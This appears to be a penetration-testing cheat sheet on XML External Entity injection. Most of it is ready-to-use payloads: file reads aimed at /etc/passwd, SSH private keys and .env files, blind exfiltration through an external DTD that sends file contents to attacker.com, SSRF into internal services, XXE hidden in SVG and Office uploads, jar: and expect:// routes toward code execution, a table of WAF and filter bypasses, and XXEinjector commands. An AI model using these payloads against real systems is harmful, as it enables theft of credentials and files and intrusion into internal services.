# XML External Entity (XXE) Injection

## Detection

XXE applies wherever the application parses XML input: SOAP APIs,
SVG uploads, SAML responses, Office documents (OOXML), RSS feeds,
sitemap parsers, and any endpoint accepting `Content-Type: application/xml`.

## Basic XXE — File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Common File Targets

```
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///app/.env
file:///app/flag.txt
```

## Blind XXE — Out-of-Band (OOB)

**When**: Entity value is not reflected in the response.

### Parameter Entity + External DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd** (hosted on attacker server):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Via Error Messages

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The error message includes the file content in the "file not found" path.

## XXE → SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>
<root>&xxe;</root>
```

Access internal services, cloud metadata endpoints, or localhost
services through the XML parser's HTTP client.

## XXE in File Uploads

### SVG

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### XLSX / DOCX

Office documents are ZIP archives containing XML files.
Inject XXE into `xl/sharedStrings.xml`, `word/document.xml`,
or `[Content_Types].xml`.

```bash
# Unzip, inject XXE, re-zip
unzip document.xlsx -d tmp/
# Edit tmp/xl/sharedStrings.xml to add DOCTYPE with entity
cd tmp && zip -r ../malicious.xlsx *
```

## XXE → RCE

### PHP expect://

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

Requires the `expect` PHP extension (rare).

### Java Jar Protocol

```xml
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/payload">
```

May trigger deserialization.

## Filter Bypass

| Filter | Bypass |
|---|---|
| `<!ENTITY` blocked | Use parameter entities `<!ENTITY %` |
| `SYSTEM` blocked | Try `PUBLIC` keyword |
| `http://` blocked | `file://`, `ftp://`, `gopher://`, `php://` |
| XML parsed but entities disabled | Try XInclude: `<xi:include href="file:///etc/passwd"/>` |
| Content-Type check | Change to `application/xml` or `text/xml` |
| WAF blocks `<!DOCTYPE` | Encode, use nested entities, newlines |

## XInclude

**When**: You don't control the full XML document (e.g., your input
is inserted into an existing XML structure).

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Tools

```bash
# XXEinjector — automated OOB XXE
xxeinjector --host=attacker.com --file=/etc/passwd --httpport=8080

# Manual testing with curl
curl -X POST -H "Content-Type: application/xml" -d @xxe.xml http://target/api
```
